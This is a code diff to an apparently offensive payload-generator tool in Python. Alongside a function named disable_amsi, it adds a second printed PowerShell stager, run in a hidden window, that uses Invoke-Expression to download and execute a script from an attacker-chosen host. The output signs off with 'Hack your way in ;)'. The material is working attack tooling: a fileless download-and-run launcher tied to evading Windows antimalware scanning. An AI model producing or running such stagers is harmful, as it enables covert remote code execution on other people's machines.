@@ -130,6 +130,7 @@ def disable_amsi(session):
 def generate(hostname, path, proto, interval):
     print((colored("#====================", "red")))
     print(("powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
+    print(("powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
     print("Hack your way in ;)")
     print((colored("#====================", "red")))
 
